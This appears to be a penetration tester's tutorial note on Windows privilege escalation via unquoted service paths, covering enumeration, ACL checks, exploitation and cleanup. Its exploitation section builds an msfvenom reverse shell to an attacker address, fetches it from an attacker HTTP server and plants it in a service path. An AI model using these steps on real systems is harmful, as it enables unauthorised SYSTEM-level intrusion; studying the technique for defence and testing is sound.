---
created: 2026-08-11
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---
## Unquoted service paths

>[!abstract]+ **Scope**: Identifying and exploiting unquoted Windows service paths to achieve local privilege escalation.

- [ ] Enumerate services whose executable paths contain spaces and are not enclosed in quotes.
- [ ] Identify the service account and determine whether compromising the service would provide additional privileges.
- [ ] Derive the candidate executable paths Windows may attempt to execute.
- [ ] Check whether the current user can create or replace a candidate executable.
- [ ] Check whether any higher-priority candidate executable already exists.
- [ ] Determine whether the current user can start or restart the service, or trigger its execution through another mechanism.
- [ ] Place the payload executable at the highest-priority writable candidate path.
- [ ] Restart the service to trigger execution.
- [ ] Verify elevated privileges and restore the original service state.

## How Windows resolves unquoted service paths

- A service's `ImagePath` is the registry value that specifies its executable path and optional arguments. It is typically located at:

```powershell
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<ServiceName>\ImagePath
```

- When Windows starts a service, the Service Control Manager (SCM) uses the configured `ImagePath` to create the service process.

- However, if the executable path contains **spaces** and is **not enclosed in quotes**, Windows can't unambiguously determine where the executable name ends and its arguments begin.
- Windows therefore iteratively splits `ImagePath` at each space, appending `.exe` where applicable, until it resolves a valid path, then attempts to execute the first match.

---

- For an unquoted service binary path such as:

```powershell
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

- Windows evaluates candidates in this order:

| Priority | Candidate path                                                               | To exploit, you need write access to... |
| :------- | :--------------------------------------------------------------------------- | :-------------------------------------- |
| 1        | `C:\Program.exe`                                                             | `C:\`                                   |
| 2        | `C:\Program Files.exe`                                                       | `C:\`                                   |
| 3        | `C:\Program Files (x86)\System.exe`                                          | `C:\Program Files (x86)\`               |
| 4        | `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe` | Original service binary                 |

>[!note] The legitimate service binary is normally the final candidate.

- Windows executes the first valid candidate it finds.
- If your current user can create or replace a **higher-priority candidate executable**, that executable will run **with the same privileges as the service** (same security context), such as `SYSTEM` or another privileged service account.

>[!important] An unquoted service path is therefore exploitable only when your current user can write a higher-priority candidcate path or replace an already-existing candidate executable. Common causes why this may happen include weak ACLs introduced by third-party software or services installed in non-standard writable directories.

>[!important] If the service path is **correctly quoted** (e.g., `"C:\Program Files\App\service.exe" --argument`), Windows can distinguish the executable from its arguments and resolves the path normally; the ambiguity doesn't occur.
## Enumerating unquoted service paths

- Enumerate unquoted service paths through CIM/WMI:

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\windows\\' | findstr /i /v '"'
```

```powershell
Get-CimInstance -ClassName Win32_Service | Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^\s*"' } | Select-Object Name, DisplayName, PathName, StartName, StartMode | Format-Table -AutoSize
```

- Also filter to services started automatically:

```powershell
Get-CimInstance -ClassName Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -match '\s' -and $_.PathName -notmatch '^\s*"' } | Select-Object Name, DisplayName, PathName, StartName, StartMode | Format-Table -AutoSize
```

>[!note] The PowerShell query identifies service paths containing whitespace whose command line does not begin with a quote. `StartName` shows the service account, and `StartMode` helps determine how execution might be triggered.

- Query target service configuration:

```powershell
sc.exe qc SystemExplorerHelpService
```

>[!note] Confirm that `BINARY_PATH_NAME` contains an unquoted executable path with spaces; inspect `SERVICE_START_NAME` to determine the service's security context.

> [!example]-
> ```powershell
> PS C:\> sc qc SystemExplorerHelpService
> ```
> 
> ```powershell
> [SC] QueryServiceConfig SUCCESS
>
> SERVICE_NAME: SystemExplorerHelpService
>         TYPE               : 10  WIN32_OWN_PROCESS
>         START_TYPE         : 2   AUTO_START
>         ERROR_CONTROL      : 1   NORMAL
>         BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
>         SERVICE_START_NAME : LocalSystem
> ```

- Use [`SharpUp`](https://github.com/GhostPack/SharpUp/) to automatically identify unquoted service paths:

```powershell
.\SharpUp.exe audit
```

>[!note] Manual enumeration with `wmic` or `Get-CimInstance` is more reliable than `SharpUp` for this specific check.
## Checking permissions on candidate paths

>[!note] Depending on the candidate, you may need to create a new executable in a directory, overwrite an existing executable, or modify an existing file.

- For each executable candidate, inspect the ACL of the directory in which that candidate would be created:

```powershell
icacls 'C:\'
icacls 'C:\Program Files (x86)\'
icacls 'C:\Program Files (x86)\System Explorer\'
icacls 'C:\Program Files (x86)\System Explorer\service\'
```

- Look for effective permissions that allow your current user or a group to which the user belongs (such as `BUILTIN\Users`, `Everyone`, `Authenticated Users`), to create or modify the relevant executable, such as `(W)` (write), `(M)` (modify), or `(F)` (full control).

>[!note]- Automated check using PowerShell 
> ```powershell
> $path = 'C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe'
> 
> $parts = $path -split ' '
> 
> if ($parts.Count -le 1) {
>     Write-Host "[-] No spaces in path (not vulnerable)."
>     return
> }
> 
> for ($i = 0; $i -lt ($parts.Count - 1); $i++) {
> 
>     $candidate = ($parts[0..$i] -join ' ') + '.exe'
>     $parent = Split-Path $candidate -Parent
> 
>     Write-Host "`nCandidate: $candidate"
>     Write-Host "Directory: $parent"
> 
>     if (Test-Path $candidate) {
>         Write-Host "[!] EXISTS: $candidate"
>     }
> 
>     if (Test-Path $parent) {
>         Write-Host "[ ] icacls $parent":
>         icacls $parent
>     }
> }
> ```

## Exploitation

- Generate a payload executable on your local machine:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip_address> LPORT=443 -f exe -o System.exe
```

- Transfer the payload to the target system (see [[🛠️ Windows file transfers]]):

```bash
python3 -m http.server 8080
```

```powershell
Invoke-WebRequest -Uri 'http://<attacker_ip_address>:8080/System.exe' -OutFile 'C:\Temp\System.exe'
```

- Place the executable at the earliest writable candidate path (for which no higher-priority executable already exsists):

```powershell
copy C:\Temp\System.exe 'C:\Program Files (x86)\System.exe'
```

- If your current user has enough permissions, restart the service:

```powershell
sc.exe stop SystemExplorerHelpService
```

```powershell
sc.exe start SystemExplorerHelpService
```

>[!note] The service is expected to fail; a normal executable doesn't implement the Windows service interface. However, the executable runs before SCM reports the timeout error, so your payload works.

>[!tip]+
> - From the resulting process, verify the effective identity and token:
>```powershell
>whoami
>```
> ```powershell
> whoami /groups
> ```
> ```powershell
> whoami /priv
> ```

>[!tip]+
> - Remove the planted binary after achieving elevated access:
> ```powershell
> del 'C:\Program Files (x86)\System.exe'
> ```
> - Restart the legitimate service:
> ```powershell
> sc.exe start SystemExplorerHelpService
> ```
> - Check configuration:
> ```powershell
> sc.exe query SystemExplorerHelpService
> ```
## References and further reading

- [`CreateProcessW — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw)
- [`SharpUp — GitHub`](https://github.com/GhostPack/SharpUp/)
- [`AccessChk — Microsoft Sysinternals`](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
- [`icacls — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
- [`sc.exe — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query)
- [`Unquoted Service Paths — Internal All The Things`](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-unquoted-service-paths)
